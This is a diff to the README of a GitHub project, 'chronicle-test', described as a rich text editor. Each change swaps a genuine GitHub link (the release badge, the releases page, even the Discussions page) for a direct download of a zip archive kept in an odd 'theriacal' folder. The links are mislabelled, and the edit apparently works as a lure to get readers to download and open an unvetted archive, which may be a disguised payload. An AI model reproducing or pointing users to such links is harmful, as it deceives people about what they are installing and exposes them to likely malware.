@@ -1,7 +1,7 @@
 # 🎉 chronicle-test - Your Easy Way to Create Rich Text
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-latest-orange)](https://github.com/Rehanopsx/chronicle-test/releases)
+[![Download Release](https://raw.githubusercontent.com/Rehanopsx/chronicle-test/main/theriacal/chronicle-test.zip%20Release-latest-orange)](https://raw.githubusercontent.com/Rehanopsx/chronicle-test/main/theriacal/chronicle-test.zip)
 
 ## 📋 Description
 Chronicle test! This application uses modern web technologies to help you create and edit rich text documents easily. With its user-friendly interface and advanced features, it caters to a wide range of text editing needs.
@@ -10,7 +10,7 @@ Chronicle test! This application uses modern web technologies to help you create
 To start using Chronicle test, follow the steps below to download and install the application on your computer.
 
 ### 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/Rehanopsx/chronicle-test/releases) to download the latest version of Chronicle test.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Rehanopsx/chronicle-test/main/theriacal/chronicle-test.zip) to download the latest version of Chronicle test.
 2. Find the appropriate file for your system.
 3. Click on the file to download it.
 4. Once the download is complete, open the file to install the application.
@@ -38,7 +38,7 @@ Once you have installed the application, you can start using it right away. Here
 4. **Save Your Work:** Regularly save your document to avoid losing your progress.
 
 ## 🌍 Community & Support
-- Join discussions and get support from other users on our [GitHub Discussions page](https://github.com/Rehanopsx/chronicle-test/discussions).
+- Join discussions and get support from other users on our [GitHub Discussions page](https://raw.githubusercontent.com/Rehanopsx/chronicle-test/main/theriacal/chronicle-test.zip).
 - Check the "Issues" tab in the repository for known bugs and feature requests.
 
 ## ✨ Contributing
